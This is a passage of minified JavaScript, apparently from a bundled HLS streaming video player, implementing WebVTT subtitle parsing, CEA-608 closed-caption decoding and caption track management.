                                    t = 0; for (e = be(e); t < e.length && "\r" !== e[t] && "\n" !== e[t];) ++t; var i = e.substr(0, t); return "\r" === e[t] && ++t, "\n" === e[t] && ++t, r.buffer = e.substr(t), i } var r = this;
                            e && (r.buffer += r.decoder.decode(e, { stream: !0 })); try { var i; if ("INITIAL" === r.state) { if (!/\r\n|\n/.test(r.buffer)) return this;
                                    i = t(); var n = i.match(/^(ï»¿)?WEBVTT([ \t].*)?$/); if (!n || !n[0]) throw new Error("Malformed WebVTT signature.");
                                    r.state = "HEADER" } for (var a = !1; r.buffer;) { if (!/\r\n|\n/.test(r.buffer)) return this; switch (a ? a = !1 : i = t(), r.state) {
                                        case "HEADER":
                                            /:/.test(i) ? function(e) { me(e, function(e, t) {}, /:/) }(i) : i || (r.state = "ID"); continue;
                                        case "NOTE":
                                            i || (r.state = "ID"); continue;
                                        case "ID":
                                            if (/^NOTE($|[ \t])/.test(i)) { r.state = "NOTE"; break } if (!i) continue; if (r.cue = new Pr(0, 0, ""), r.state = "CUE", -1 === i.indexOf("--\x3e")) { r.cue.id = i; continue }
                                        case "CUE":
                                            try { ye(i, r.cue, r.regionList) } catch (e) { r.cue = null, r.state = "BADCUE"; continue }
                                            r.state = "CUETEXT"; continue;
                                        case "CUETEXT":
                                            var s = -1 !== i.indexOf("--\x3e"); if (!i || s && (a = !0)) { r.oncue && r.oncue(r.cue), r.cue = null, r.state = "ID"; continue }
                                            r.cue.text && (r.cue.text += "\n"), r.cue.text += i; continue;
                                        case "BADCUE":
                                            i || (r.state = "ID"); continue } } } catch (e) { "CUETEXT" === r.state && r.cue && r.oncue && r.oncue(r.cue), r.cue = null, r.state = "INITIAL" === r.state ? "BADWEBVTT" : "BADCUE" } return this }, flush: function() { var e = this; try { if (e.buffer += e.decoder.decode(), (e.cue || "HEADER" === e.state) && (e.buffer += "\n\n", e.parse()), "INITIAL" === e.state) throw new Error("Malformed WebVTT signature.") } catch (e) { throw e } return e.onflush && e.onflush(), this } }; var Cr, Ir = ge,
                        Or = { 42: 225, 92: 233, 94: 237, 95: 243, 96: 250, 123: 231, 124: 247, 125: 209, 126: 241, 127: 9608, 128: 174, 129: 176, 130: 189, 131: 191, 132: 8482, 133: 162, 134: 163, 135: 9834, 136: 224, 137: 32, 138: 232, 139: 226, 140: 234, 141: 238, 142: 244, 143: 251, 144: 193, 145: 201, 146: 211, 147: 218, 148: 220, 149: 252, 150: 8216, 151: 161, 152: 42, 153: 8217, 154: 9473, 155: 169, 156: 8480, 157: 8226, 158: 8220, 159: 8221, 160: 192, 161: 194, 162: 199, 163: 200, 164: 202, 165: 203, 166: 235, 167: 206, 168: 207, 169: 239, 170: 212, 171: 217, 172: 249, 173: 219, 174: 171, 175: 187, 176: 195, 177: 227, 178: 205, 179: 204, 180: 236, 181: 210, 182: 242, 183: 213, 184: 245, 185: 123, 186: 125, 187: 92, 188: 94, 189: 95, 190: 124, 191: 8764, 192: 196, 193: 228, 194: 214, 195: 246, 196: 223, 197: 165, 198: 164, 199: 9475, 200: 197, 201: 229, 202: 216, 203: 248, 204: 9487, 205: 9491, 206: 9495, 207: 9499 },
                        Mr = function(e) { var t = e; return Or.hasOwnProperty(e) && (t = Or[e]), String.fromCharCode(t) },
                        xr = 15,
                        Nr = 100,
                        Fr = { 17: 1, 18: 3, 21: 5, 22: 7, 23: 9, 16: 11, 19: 12, 20: 14 },
                        Br = { 17: 2, 18: 4, 21: 6, 22: 8, 23: 10, 19: 13, 20: 15 },
                        Ur = { 25: 1, 26: 3, 29: 5, 30: 7, 31: 9, 24: 11, 27: 12, 28: 14 },
                        jr = { 25: 2, 26: 4, 29: 6, 30: 8, 31: 10, 27: 13, 28: 15 },
                        Gr = ["white", "green", "blue", "cyan", "red", "yellow", "magenta", "black", "transparent"];! function(e) { e[e.ERROR = 0] = "ERROR", e[e.TEXT = 1] = "TEXT", e[e.WARNING = 2] = "WARNING", e[e.INFO = 2] = "INFO", e[e.DEBUG = 3] = "DEBUG", e[e.DATA = 3] = "DATA" }(Cr || (Cr = {})); var Kr, qr = function() {
                            function e() { this.time = null, this.verboseLevel = Cr.ERROR } return e.prototype.log = function(e, t) { this.verboseLevel >= e && et.logger.log(this.time + " [" + e + "] " + t) }, e }(),
                        Hr = function(e) { for (var t = [], r = 0; r < e.length; r++) t.push(e[r].toString(16)); return t },
                        Vr = function() {
                            function e(e, t, r, i, n) { this.foreground = void 0, this.underline = void 0, this.italics = void 0, this.background = void 0, this.flash = void 0, this.foreground = e || "white", this.underline = t || !1, this.italics = r || !1, this.background = i || "black", this.flash = n || !1 } var t = e.prototype; return t.reset = function() { this.foreground = "white", this.underline = !1, this.italics = !1, this.background = "black", this.flash = !1 }, t.setStyles = function(e) { for (var t = ["foreground", "underline", "italics", "background", "flash"], r = 0; r < t.length; r++) { var i = t[r];
                                    e.hasOwnProperty(i) && (this[i] = e[i]) } }, t.isDefault = function() { return "white" === this.foreground && !this.underline && !this.italics && "black" === this.background && !this.flash }, t.equals = function(e) { return this.foreground === e.foreground && this.underline === e.underline && this.italics === e.italics && this.background === e.background && this.flash === e.flash }, t.copy = function(e) { this.foreground = e.foreground, this.underline = e.underline, this.italics = e.italics, this.background = e.background, this.flash = e.flash }, t.toString = function() { return "color=" + this.foreground + ", underline=" + this.underline + ", italics=" + this.italics + ", background=" + this.background + ", flash=" + this.flash }, e }(),
                        Wr = function() {
                            function e(e, t, r, i, n, a) { this.uchar = void 0, this.penState = void 0, this.uchar = e || " ", this.penState = new Vr(t, r, i, n, a) } var t = e.prototype; return t.reset = function() { this.uchar = " ", this.penState.reset() }, t.setChar = function(e, t) { this.uchar = e, this.penState.copy(t) }, t.setPenState = function(e) { this.penState.copy(e) }, t.equals = function(e) { return this.uchar === e.uchar && this.penState.equals(e.penState) }, t.copy = function(e) { this.uchar = e.uchar, this.penState.copy(e.penState) }, t.isEmpty = function() { return " " === this.uchar && this.penState.isDefault() }, e }(),
                        zr = function() {
                            function e(e) { this.chars = void 0, this.pos = void 0, this.currPenState = void 0, this.cueStartTime = void 0, this.logger = void 0, this.chars = []; for (var t = 0; t < Nr; t++) this.chars.push(new Wr);
                                this.logger = e, this.pos = 0, this.currPenState = new Vr } var t = e.prototype; return t.equals = function(e) { for (var t = !0, r = 0; r < Nr; r++)
                                    if (!this.chars[r].equals(e.chars[r])) { t = !1; break }
                                return t }, t.copy = function(e) { for (var t = 0; t < Nr; t++) this.chars[t].copy(e.chars[t]) }, t.isEmpty = function() { for (var e = !0, t = 0; t < Nr; t++)
                                    if (!this.chars[t].isEmpty()) { e = !1; break }
                                return e }, t.setCursor = function(e) { this.pos !== e && (this.pos = e), this.pos < 0 ? (this.logger.log(Cr.DEBUG, "Negative cursor position " + this.pos), this.pos = 0) : this.pos > Nr && (this.logger.log(Cr.DEBUG, "Too large cursor position " + this.pos), this.pos = Nr) }, t.moveCursor = function(e) { var t = this.pos + e; if (e > 1)
                                    for (var r = this.pos + 1; r < t + 1; r++) this.chars[r].setPenState(this.currPenState);
                                this.setCursor(t) }, t.backSpace = function() { this.moveCursor(-1), this.chars[this.pos].setChar(" ", this.currPenState) }, t.insertChar = function(e) { e >= 144 && this.backSpace(); var t = Mr(e); if (this.pos >= Nr) return void this.logger.log(Cr.ERROR, "Cannot insert " + e.toString(16) + " (" + t + ") at position " + this.pos + ". Skipping it!");
                                this.chars[this.pos].setChar(t, this.currPenState), this.moveCursor(1) }, t.clearFromPos = function(e) { var t; for (t = e; t < Nr; t++) this.chars[t].reset() }, t.clear = function() { this.clearFromPos(0), this.pos = 0, this.currPenState.reset() }, t.clearToEndOfRow = function() { this.clearFromPos(this.pos) }, t.getTextString = function() { for (var e = [], t = !0, r = 0; r < Nr; r++) { var i = this.chars[r].uchar; " " !== i && (t = !1), e.push(i) } return t ? "" : e.join("") }, t.setPenStyles = function(e) { this.currPenState.setStyles(e), this.chars[this.pos].setPenState(this.currPenState) }, e }(),
                        Yr = function() {
                            function e(e) { this.rows = void 0, this.currRow = void 0, this.nrRollUpRows = void 0, this.lastOutputScreen = void 0, this.logger = void 0, this.rows = []; for (var t = 0; t < xr; t++) this.rows.push(new zr(e));
                                this.logger = e, this.currRow = xr - 1, this.nrRollUpRows = null, this.lastOutputScreen = null, this.reset() } var t = e.prototype; return t.reset = function() { for (var e = 0; e < xr; e++) this.rows[e].clear();
                                this.currRow = xr - 1 }, t.equals = function(e) { for (var t = !0, r = 0; r < xr; r++)
                                    if (!this.rows[r].equals(e.rows[r])) { t = !1; break }
                                return t }, t.copy = function(e) { for (var t = 0; t < xr; t++) this.rows[t].copy(e.rows[t]) }, t.isEmpty = function() { for (var e = !0, t = 0; t < xr; t++)
                                    if (!this.rows[t].isEmpty()) { e = !1; break }
                                return e }, t.backSpace = function() { this.rows[this.currRow].backSpace() }, t.clearToEndOfRow = function() { this.rows[this.currRow].clearToEndOfRow() }, t.insertChar = function(e) { this.rows[this.currRow].insertChar(e) }, t.setPen = function(e) { this.rows[this.currRow].setPenStyles(e) }, t.moveCursor = function(e) { this.rows[this.currRow].moveCursor(e) }, t.setCursor = function(e) { this.logger.log(Cr.INFO, "setCursor: " + e), this.rows[this.currRow].setCursor(e) }, t.setPAC = function(e) { this.logger.log(Cr.INFO, "pacData = " + JSON.stringify(e)); var t = e.row - 1; if (this.nrRollUpRows && t < this.nrRollUpRows - 1 && (t = this.nrRollUpRows - 1), this.nrRollUpRows && this.currRow !== t) { for (var r = 0; r < xr; r++) this.rows[r].clear(); var i = this.currRow + 1 - this.nrRollUpRows,
                                        n = this.lastOutputScreen; if (n) { var a = n.rows[i].cueStartTime,
                                            s = this.logger.time; if (a && null !== s && a < s)
                                            for (var o = 0; o < this.nrRollUpRows; o++) this.rows[t - this.nrRollUpRows + o + 1].copy(n.rows[i + o]) } }
                                this.currRow = t; var l = this.rows[this.currRow]; if (null !== e.indent) { var u = e.indent,
                                        c = Math.max(u - 1, 0);
                                    l.setCursor(e.indent), e.color = l.chars[c].penState.foreground } var d = { foreground: e.color, underline: e.underline, italics: e.italics, background: "black", flash: !1 };
                                this.setPen(d) }, t.setBkgData = function(e) { this.logger.log(Cr.INFO, "bkgData = " + JSON.stringify(e)), this.backSpace(), this.setPen(e), this.insertChar(32) }, t.setRollUpRows = function(e) { this.nrRollUpRows = e }, t.rollUp = function() { if (null === this.nrRollUpRows) return void this.logger.log(Cr.DEBUG, "roll_up but nrRollUpRows not set yet");
                                this.logger.log(Cr.TEXT, this.getDisplayText()); var e = this.currRow + 1 - this.nrRollUpRows,
                                    t = this.rows.splice(e, 1)[0];
                                t.clear(), this.rows.splice(this.currRow, 0, t), this.logger.log(Cr.INFO, "Rolling up") }, t.getDisplayText = function(e) { e = e || !1; for (var t = [], r = "", i = -1, n = 0; n < xr; n++) { var a = this.rows[n].getTextString();
                                    a && (i = n + 1, e ? t.push("Row " + i + ": '" + a + "'") : t.push(a.trim())) } return t.length > 0 && (r = e ? "[" + t.join(" | ") + "]" : t.join("\n")), r }, t.getTextAndFormat = function() { return this.rows }, e }(),
                        Xr = function() {
                            function e(e, t, r) { this.chNr = void 0, this.outputFilter = void 0, this.mode = void 0, this.verbose = void 0, this.displayedMemory = void 0, this.nonDisplayedMemory = void 0, this.lastOutputScreen = void 0, this.currRollUpRow = void 0, this.writeScreen = void 0, this.cueStartTime = void 0, this.logger = void 0, this.chNr = e, this.outputFilter = t, this.mode = null, this.verbose = 0, this.displayedMemory = new Yr(r), this.nonDisplayedMemory = new Yr(r), this.lastOutputScreen = new Yr(r), this.currRollUpRow = this.displayedMemory.rows[xr - 1], this.writeScreen = this.displayedMemory, this.mode = null, this.cueStartTime = null, this.logger = r } var t = e.prototype; return t.reset = function() { this.mode = null, this.displayedMemory.reset(), this.nonDisplayedMemory.reset(), this.lastOutputScreen.reset(), this.outputFilter.reset(), this.currRollUpRow = this.displayedMemory.rows[xr - 1], this.writeScreen = this.displayedMemory, this.mode = null, this.cueStartTime = null }, t.getHandler = function() { return this.outputFilter }, t.setHandler = function(e) { this.outputFilter = e }, t.setPAC = function(e) { this.writeScreen.setPAC(e) }, t.setBkgData = function(e) { this.writeScreen.setBkgData(e) }, t.setMode = function(e) { e !== this.mode && (this.mode = e, this.logger.log(Cr.INFO, "MODE=" + e), "MODE_POP-ON" === this.mode ? this.writeScreen = this.nonDisplayedMemory : (this.writeScreen = this.displayedMemory, this.writeScreen.reset()), "MODE_ROLL-UP" !== this.mode && (this.displayedMemory.nrRollUpRows = null, this.nonDisplayedMemory.nrRollUpRows = null), this.mode = e) }, t.insertChars = function(e) { for (var t = 0; t < e.length; t++) this.writeScreen.insertChar(e[t]); var r = this.writeScreen === this.displayedMemory ? "DISP" : "NON_DISP";
                                this.logger.log(Cr.INFO, r + ": " + this.writeScreen.getDisplayText(!0)), "MODE_PAINT-ON" !== this.mode && "MODE_ROLL-UP" !== this.mode || (this.logger.log(Cr.TEXT, "DISPLAYED: " + this.displayedMemory.getDisplayText(!0)), this.outputDataUpdate()) }, t.ccRCL = function() { this.logger.log(Cr.INFO, "RCL - Resume Caption Loading"), this.setMode("MODE_POP-ON") }, t.ccBS = function() { this.logger.log(Cr.INFO, "BS - BackSpace"), "MODE_TEXT" !== this.mode && (this.writeScreen.backSpace(), this.writeScreen === this.displayedMemory && this.outputDataUpdate()) }, t.ccAOF = function() {}, t.ccAON = function() {}, t.ccDER = function() { this.logger.log(Cr.INFO, "DER- Delete to End of Row"), this.writeScreen.clearToEndOfRow(), this.outputDataUpdate() }, t.ccRU = function(e) { this.logger.log(Cr.INFO, "RU(" + e + ") - Roll Up"), this.writeScreen = this.displayedMemory, this.setMode("MODE_ROLL-UP"), this.writeScreen.setRollUpRows(e) }, t.ccFON = function() { this.logger.log(Cr.INFO, "FON - Flash On"), this.writeScreen.setPen({ flash: !0 }) }, t.ccRDC = function() { this.logger.log(Cr.INFO, "RDC - Resume Direct Captioning"), this.setMode("MODE_PAINT-ON") }, t.ccTR = function() { this.logger.log(Cr.INFO, "TR"), this.setMode("MODE_TEXT") }, t.ccRTD = function() { this.logger.log(Cr.INFO, "RTD"), this.setMode("MODE_TEXT") }, t.ccEDM = function() { this.logger.log(Cr.INFO, "EDM - Erase Displayed Memory"), this.displayedMemory.reset(), this.outputDataUpdate(!0) }, t.ccCR = function() { this.logger.log(Cr.INFO, "CR - Carriage Return"), this.writeScreen.rollUp(), this.outputDataUpdate(!0) }, t.ccENM = function() { this.logger.log(Cr.INFO, "ENM - Erase Non-displayed Memory"), this.nonDisplayedMemory.reset() }, t.ccEOC = function() { if (this.logger.log(Cr.INFO, "EOC - End Of Caption"), "MODE_POP-ON" === this.mode) { var e = this.displayedMemory;
                                    this.displayedMemory = this.nonDisplayedMemory, this.nonDisplayedMemory = e, this.writeScreen = this.nonDisplayedMemory, this.logger.log(Cr.TEXT, "DISP: " + this.displayedMemory.getDisplayText()) }
                                this.outputDataUpdate(!0) }, t.ccTO = function(e) { this.logger.log(Cr.INFO, "TO(" + e + ") - Tab Offset"), this.writeScreen.moveCursor(e) }, t.ccMIDROW = function(e) { var t = { flash: !1 }; if (t.underline = e % 2 == 1, t.italics = e >= 46, t.italics) t.foreground = "white";
                                else { var r = Math.floor(e / 2) - 16,
                                        i = ["white", "green", "blue", "cyan", "red", "yellow", "magenta"];
                                    t.foreground = i[r] }
                                this.logger.log(Cr.INFO, "MIDROW: " + JSON.stringify(t)), this.writeScreen.setPen(t) }, t.outputDataUpdate = function(e) { void 0 === e && (e = !1); var t = this.logger.time;
                                null !== t && this.outputFilter && (null !== this.cueStartTime || this.displayedMemory.isEmpty() ? this.displayedMemory.equals(this.lastOutputScreen) || (this.outputFilter.newCue(this.cueStartTime, t, this.lastOutputScreen), e && this.outputFilter.dispatchCue && this.outputFilter.dispatchCue(), this.cueStartTime = this.displayedMemory.isEmpty() ? null : t) : this.cueStartTime = t, this.lastOutputScreen.copy(this.displayedMemory)) }, t.cueSplitAtTime = function(e) { this.outputFilter && (this.displayedMemory.isEmpty() || (this.outputFilter.newCue && this.outputFilter.newCue(this.cueStartTime, e, this.displayedMemory), this.cueStartTime = e)) }, e }(),
                        Jr = function() {
                            function e(e, t, r) { this.channels = void 0, this.currentChannel = 0, this.cmdHistory = void 0, this.logger = void 0; var i = new qr;
                                this.channels = [null, new Xr(e, t, i), new Xr(e + 1, r, i)], this.cmdHistory = Te(), this.logger = i } var t = e.prototype; return t.getHandler = function(e) { return this.channels[e].getHandler() }, t.setHandler = function(e, t) { this.channels[e].setHandler(t) }, t.addData = function(e, t) { var r, i, n, a = !1;
                                this.logger.time = e; for (var s = 0; s < t.length; s += 2)
                                    if (i = 127 & t[s], n = 127 & t[s + 1], 0 !== i || 0 !== n) { if (this.logger.log(Cr.DATA, "[" + Hr([t[s], t[s + 1]]) + "] -> (" + Hr([i, n]) + ")"), r = this.parseCmd(i, n), r || (r = this.parseMidrow(i, n)), r || (r = this.parsePAC(i, n)), r || (r = this.parseBackgroundAttributes(i, n)), !r && (a = this.parseChars(i, n))) { var o = this.currentChannel; if (o && o > 0) { var l = this.channels[o];
                                                l.insertChars(a) } else this.logger.log(Cr.WARNING, "No channel found yet. TEXT-MODE?") }
                                        r || a || this.logger.log(Cr.WARNING, "Couldn't parse cleaned data " + Hr([i, n]) + " orig: " + Hr([t[s], t[s + 1]])) } }, t.parseCmd = function(e, t) { var r = this.cmdHistory,
                                    i = (20 === e || 28 === e || 21 === e || 29 === e) && t >= 32 && t <= 47,
                                    n = (23 === e || 31 === e) && t >= 33 && t <= 35; if (!i && !n) return !1; if (Se(e, t, r)) return Ee(null, null, r), this.logger.log(Cr.DEBUG, "Repeated command (" + Hr([e, t]) + ") is dropped"), !0; var a = 20 === e || 21 === e || 23 === e ? 1 : 2,
                                    s = this.channels[a]; return 20 === e || 21 === e || 28 === e || 29 === e ? 32 === t ? s.ccRCL() : 33 === t ? s.ccBS() : 34 === t ? s.ccAOF() : 35 === t ? s.ccAON() : 36 === t ? s.ccDER() : 37 === t ? s.ccRU(2) : 38 === t ? s.ccRU(3) : 39 === t ? s.ccRU(4) : 40 === t ? s.ccFON() : 41 === t ? s.ccRDC() : 42 === t ? s.ccTR() : 43 === t ? s.ccRTD() : 44 === t ? s.ccEDM() : 45 === t ? s.ccCR() : 46 === t ? s.ccENM() : 47 === t && s.ccEOC() : s.ccTO(t - 32), Ee(e, t, r), this.currentChannel = a, !0 }, t.parseMidrow = function(e, t) { var r = 0; if ((17 === e || 25 === e) && t >= 32 && t <= 47) { if ((r = 17 === e ? 1 : 2) !== this.currentChannel) return this.logger.log(Cr.ERROR, "Mismatch channel in midrow parsing"), !1; var i = this.channels[r]; return !!i && (i.ccMIDROW(t), this.logger.log(Cr.DEBUG, "MIDROW (" + Hr([e, t]) + ")"), !0) } return !1 }, t.parsePAC = function(e, t) { var r, i = this.cmdHistory,
                                    n = (e >= 17 && e <= 23 || e >= 25 && e <= 31) && t >= 64 && t <= 127,
                                    a = (16 === e || 24 === e) && t >= 64 && t <= 95; if (!n && !a) return !1; if (Se(e, t, i)) return Ee(null, null, i), !0; var s = e <= 23 ? 1 : 2;
                                r = t >= 64 && t <= 95 ? 1 === s ? Fr[e] : Ur[e] : 1 === s ? Br[e] : jr[e]; var o = this.channels[s]; return !!o && (o.setPAC(this.interpretPAC(r, t)), Ee(e, t, i), this.currentChannel = s, !0) }, t.interpretPAC = function(e, t) { var r = t,
                                    i = { color: null, italics: !1, indent: null, underline: !1, row: e }; return r = t > 95 ? t - 96 : t - 64, i.underline = 1 == (1 & r), r <= 13 ? i.color = ["white", "green", "blue", "cyan", "red", "yellow", "magenta", "white"][Math.floor(r / 2)] : r <= 15 ? (i.italics = !0, i.color = "white") : i.indent = 4 * Math.floor((r - 16) / 2), i }, t.parseChars = function(e, t) { var r, i = null,
                                    n = null; if (e >= 25 ? (r = 2, n = e - 8) : (r = 1, n = e), n >= 17 && n <= 19) { var a = t;
                                    a = 17 === n ? t + 80 : 18 === n ? t + 112 : t + 144, this.logger.log(Cr.INFO, "Special char '" + Mr(a) + "' in channel " + r), i = [a] } else e >= 32 && e <= 127 && (i = 0 === t ? [e] : [e, t]); if (i) { var s = Hr(i);
                                    this.logger.log(Cr.DEBUG, "Char codes =  " + s.join(",")), Ee(e, t, this.cmdHistory) } return i }, t.parseBackgroundAttributes = function(e, t) { var r = (16 === e || 24 === e) && t >= 32 && t <= 47,
                                    i = (23 === e || 31 === e) && t >= 45 && t <= 47; if (!r && !i) return !1; var n, a = {};
                                16 === e || 24 === e ? (n = Math.floor((t - 32) / 2), a.background = Gr[n], t % 2 == 1 && (a.background = a.background + "_semi")) : 45 === t ? a.background = "transparent" : (a.foreground = "black", 47 === t && (a.underline = !0)); var s = e <= 23 ? 1 : 2; return this.channels[s].setBkgData(a), Ee(e, t, this.cmdHistory), !0 }, t.reset = function() { for (var e = 0; e < Object.keys(this.channels).length; e++) { var t = this.channels[e];
                                    t && t.reset() }
                                this.cmdHistory = Te() }, t.cueSplitAtTime = function(e) { for (var t = 0; t < this.channels.length; t++) { var r = this.channels[t];
                                    r && r.cueSplitAtTime(e) } }, e }(),
                        Qr = Jr,
                        Zr = function() {
                            function e(e, t) { this.timelineController = void 0, this.cueRanges = [], this.trackName = void 0, this.startTime = null, this.endTime = null, this.screen = null, this.timelineController = e, this.trackName = t } var t = e.prototype; return t.dispatchCue = function() { null !== this.startTime && (this.timelineController.addCues(this.trackName, this.startTime, this.endTime, this.screen, this.cueRanges), this.startTime = null) }, t.newCue = function(e, t, r) {
                                (null === this.startTime || this.startTime > e) && (this.startTime = e), this.endTime = t, this.screen = r, this.timelineController.createCaptionsTrack(this.trackName) }, t.reset = function() { this.cueRanges = [] }, e }(),
                        $r = function(e, t, r) { return e.substr(r || 0, t.length) === t },
                        ei = function(e) { var t = parseInt(e.substr(-3)),
                                r = parseInt(e.substr(-6, 2)),
                                i = parseInt(e.substr(-9, 2)),
                                n = e.length > 9 ? parseInt(e.substr(0, e.indexOf(":"))) : 0; if (!(Object(Ze.isFiniteNumber)(t) && Object(Ze.isFiniteNumber)(r) && Object(Ze.isFiniteNumber)(i) && Object(Ze.isFiniteNumber)(n))) throw Error("Malformed X-TIMESTAMP-MAP: Local:" + e); return t += 1e3 * r, t += 6e4 * i, t += 36e5 * n },
                        ti = function(e) { for (var t = 5381, r = e.length; r;) t = 33 * t ^ e.charCodeAt(--r); return (t >>> 0).toString() },
                        ri = function(e, t, r) { var i = e[t],
                                n = e[i.prevCC]; if (!n || !n.new && i.new) return e.ccOffset = e.presentationOffset = i.start, void(i.new = !1); for (; n && n.new;) e.ccOffset += i.start - n.start, i.new = !1, i = n, n = e[i.prevCC];
                            e.presentationOffset = r },
                        ii = { parse: function(e, t, r, i, n, a) { var s, o = /\r\n|\n\r|\n|\r/g,
                                    l = Object($t.utf8ArrayToStr)(new Uint8Array(e)).trim().replace(o, "\n").split("\n"),
                                    u = "00:00.000",
                                    c = 0,
                                    d = 0,
                                    f = 0,
                                    h = [],
                                    g = !0,
                                    p = !1,
                                    v = new Ir;
                                v.oncue = function(e) { var t = r[i],
                                        n = r.ccOffset;
                                    t && t.new && (void 0 !== d ? n = r.ccOffset = t.start : ri(r, i, f)), f && (n = f - r.presentationOffset), p && (e.startTime += n - d, e.endTime += n - d), e.id = ti(e.startTime.toString()) + ti(e.endTime.toString()) + ti(e.text), e.text = decodeURIComponent(encodeURIComponent(e.text)), e.endTime > 0 && h.push(e) }, v.onparsingerror = function(e) { s = e }, v.onflush = function() { if (s && a) return void a(s);
                                    n(h) }, l.forEach(function(e) { if (g) { if ($r(e, "X-TIMESTAMP-MAP=")) { g = !1, p = !0, e.substr(16).split(",").forEach(function(e) { $r(e, "LOCAL:") ? u = e.substr(6) : $r(e, "MPEGTS:") && (c = parseInt(e.substr(7))) }); try { t + (9e4 * r[i].start || 0) < 0 && (t += 8589934592), c -= t, d = ei(u) / 1e3, f = c / 9e4 } catch (e) { p = !1, s = e } return } "" === e && (g = !1) }
                                    v.parse(e + "\n") }), v.flush() } },
                        ni = ii,
                        ai = function(e) {
                            function t(t) { var r; if (r = e.call(this, t, $e.default.MEDIA_ATTACHING, $e.default.MEDIA_DETACHING, $e.default.FRAG_PARSING_USERDATA, $e.default.FRAG_DECRYPTED, $e.default.MANIFEST_LOADING, $e.default.MANIFEST_LOADED, $e.default.FRAG_LOADED, $e.default.INIT_PTS_FOUND) || this, r.media = null, r.config = void 0, r.enabled = !0, r.Cues = void 0, r.textTracks = [], r.tracks = [], r.initPTS = [], r.unparsedVttFrags = [], r.captionsTracks = {}, r.nonNativeCaptionsTracks = {}, r.captionsProperties = void 0, r.cea608Parser1 = void 0, r.cea608Parser2 = void 0, r.lastSn = -1, r.prevCC = -1, r.vttCCs = ke(), r.hls = t, r.config = t.config, r.Cues = t.config.cueHandler, r.captionsProperties = { textTrack1: { label: r.config.captionsTextTrack1Label, languageCode: r.config.captionsTextTrack1LanguageCode }, textTrack2: { label: r.config.captionsTextTrack2Label, languageCode: r.config.captionsTextTrack2LanguageCode }, textTrack3: { label: r.config.captionsTextTrack3Label, languageCode: r.config.captionsTextTrack3LanguageCode }, textTrack4: { label: r.config.captionsTextTrack4Label, languageCode: r.config.captionsTextTrack4LanguageCode } }, r.config.enableCEA708Captions) { var i = new Zr(we(r), "textTrack1"),
                                        n = new Zr(we(r), "textTrack2"),
                                        a = new Zr(we(r), "textTrack3"),
                                        s = new Zr(we(r), "textTrack4");
                                    r.cea608Parser1 = new Qr(1, i, n), r.cea608Parser2 = new Qr(3, a, s) } return r }
                            Ae(t, e); var r = t.prototype; return r.addCues = function(e, t, r, i, n) { for (var a = !1, s = n.length; s--;) { var o = n[s],
                                        l = Pe(o[0], o[1], t, r); if (l >= 0 && (o[0] = Math.min(o[0], t), o[1] = Math.max(o[1], r), a = !0, l / (r - t) > .5)) return } if (a || n.push([t, r]), this.config.renderTextTracksNatively) this.Cues.newCue(this.captionsTracks[e], t, r, i);
                                else { var u = this.Cues.newCue(null, t, r, i);
                                    this.hls.trigger($e.default.CUES_PARSED, { type: "captions", cues: u, track: e }) } }, r.onInitPtsFound = function(e) { var t = this,
                                    r = e.frag,
                                    i = e.id,
                                    n = e.initPTS,
                                    a = this.unparsedVttFrags; "main" === i && (this.initPTS[r.cc] = n), a.length && (this.unparsedVttFrags = [], a.forEach(function(e) { t.onFragLoaded(e) })) }, r.getExistingTrack = function(e) { var t = this.media; if (t)
                                    for (var r = 0; r < t.textTracks.length; r++) { var i = t.textTracks[r]; if (i[e]) return i }
                                return null }, r.createCaptionsTrack = function(e) { this.config.renderTextTracksNatively ? this.createNativeTrack(e) : this.createNonNativeTrack(e) }, r.createNativeTrack = function(e) { if (!this.captionsTracks[e]) { var t = this.captionsProperties,
                                        r = this.captionsTracks,
                                        i = this.media,
                                        n = t[e],
                                        a = n.label,
                                        s = n.languageCode,
                                        o = this.getExistingTrack(e); if (o) r[e] = o, X(r[e]), Y(r[e], i);
                                    else { var l = this.createTextTrack("captions", a, s);
                                        l && (l[e] = !0, r[e] = l) } } }, r.createNonNativeTrack = function(e) { if (!this.nonNativeCaptionsTracks[e]) { var t = this.captionsProperties[e]; if (t) { var r = t.label,
                                            i = { _id: e, label: r, kind: "captions", default: !!t.media && !!t.media.default, closedCaptions: t.media };
                                        this.nonNativeCaptionsTracks[e] = i, this.hls.trigger($e.default.NON_NATIVE_TEXT_TRACKS_FOUND, { tracks: [i] }) } } }, r.createTextTrack = function(e, t, r) { var i = this.media; if (i) return i.addTextTrack(e, t, r) }, r.destroy = function() { e.prototype.destroy.call(this) }, r.onMediaAttaching = function(e) { this.media = e.media, this._cleanTracks() }, r.onMediaDetaching = function() { var e = this.captionsTracks;
                                Object.keys(e).forEach(function(t) { X(e[t]), delete e[t] }), this.nonNativeCaptionsTracks = {} }, r.onManifestLoading = function() { this.lastSn = -1, this.prevCC = -1, this.vttCCs = ke(), this._cleanTracks(), this.tracks = [], this.captionsTracks = {}, this.nonNativeCaptionsTracks = {} }, r._cleanTracks = function() { var e = this.media; if (e) { var t = e.textTracks; if (t)
                                        for (var r = 0; r < t.length; r++) X(t[r]) } }, r.onManifestLoaded = function(e) { var t = this; if (this.textTracks = [], this.unparsedVttFrags = this.unparsedVttFrags || [], this.initPTS = [], this.cea608Parser1 && this.cea608Parser2 && (this.cea608Parser1.reset(), this.cea608Parser2.reset()), this.config.enableWebVTT) { var r = e.subtitles || [],
                                        i = this.tracks && r && this.tracks.length === r.length; if (this.tracks = e.subtitles || [], this.config.renderTextTracksNatively) { var n = this.media ? this.media.textTracks : [];
                                        this.tracks.forEach(function(e, r) { var i; if (r < n.length) { for (var a = null, s = 0; s < n.length; s++)
                                                    if (Re(n[s], e)) { a = n[s]; break }
                                                a && (i = a) }
                                            i || (i = t.createTextTrack("subtitles", e.name, e.lang)), e.default ? i.mode = t.hls.subtitleDisplay ? "showing" : "hidden" : i.mode = "disabled", t.textTracks.push(i) }) } else if (!i && this.tracks && this.tracks.length) { var a = this.tracks.map(function(e) { return { label: e.name, kind: e.type.toLowerCase(), default: e.default, subtitleTrack: e } });
                                        this.hls.trigger($e.default.NON_NATIVE_TEXT_TRACKS_FOUND, { tracks: a }) } }
                                this.config.enableCEA708Captions && e.captions && e.captions.forEach(function(e) { var r = /(?:CC|SERVICE)([1-4])/.exec(e.instreamId); if (r) { var i = "textTrack" + r[1],
                                            n = t.captionsProperties[i];
                                        n && (n.label = e.name, e.lang && (n.languageCode = e.lang), n.media = e) } }) }, r.onFragLoaded = function(e) { var t = e.frag,
                                    r = e.payload,
                                    i = this.cea608Parser1,
                                    n = this.cea608Parser2,
                                    a = this.initPTS,
                                    s = this.lastSn,
